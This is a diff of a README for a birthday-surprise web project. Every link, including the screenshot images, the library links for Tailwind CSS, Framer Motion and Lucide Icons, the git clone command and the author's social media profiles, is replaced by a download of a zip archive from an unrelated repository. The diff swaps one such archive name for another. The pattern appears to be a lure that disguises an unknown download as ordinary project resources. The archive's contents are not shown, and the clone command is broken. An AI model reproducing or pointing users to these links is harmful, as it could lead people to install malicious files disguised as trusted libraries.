@@ -1,6 +1,6 @@
 # Birthday Surprise Website 🎂🎉
 
-This is a special **Birthday Celebration Website** created using **https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip, Tailwind CSS, Framer Motion**, and **Lucide Icons**.  
+This is a special **Birthday Celebration Website** created using **https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip, Tailwind CSS, Framer Motion**, and **Lucide Icons**.  
 It's designed as a personal and emotional way to wish someone special — when you can't be there physically, let your code speak! 💖
 
 ---
@@ -23,22 +23,22 @@ This was created as part of an emotional reel where the journey begins with a fe
 ## Screenshots:
 
 1. **Loader Page**
-   ![Screenshot 1](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+   ![Screenshot 1](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
 
 2. **Countdown Page**
-   ![Screenshot 2](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+   ![Screenshot 2](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
 
 3. **Happy Birthday Message Screen**
-   ![Screenshot 3](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+   ![Screenshot 3](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
 
 ---
 
 ## 🛠️ Built With
 
-- [https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
-- [Tailwind CSS](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
-- [Framer Motion](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
-- [Lucide Icons](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- [https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
+- [Tailwind CSS](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
+- [Framer Motion](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
+- [Lucide Icons](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
 
 ---
 
@@ -47,7 +47,7 @@ This was created as part of an emotional reel where the journey begins with a fe
 To run this project locally:
 
 ```bash
-git clone https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip
+git clone https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip
 cd birthday-site
 npm install
 npm run dev
@@ -61,10 +61,10 @@ Make sure to update the target date in `Home` component if you want to reuse thi
 
 Follow for more such creative and code-based content!
 
-- 📸 **Instagram**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
-- 🎥 **YouTube**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
-- 🐦 **Twitter/X**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
-- 💼 **LinkedIn**: [Anuj Chaudhary](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for-you-my-girl-1.7.zip)
+- 📸 **Instagram**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
+- 🎥 **YouTube**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
+- 🐦 **Twitter/X**: [@anujbuilds](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
+- 💼 **LinkedIn**: [Anuj Chaudhary](https://raw.githubusercontent.com/yedoww/for-you-my-girl/main/generalness/for_my_you_girl_rax.zip)
 
 ---
 
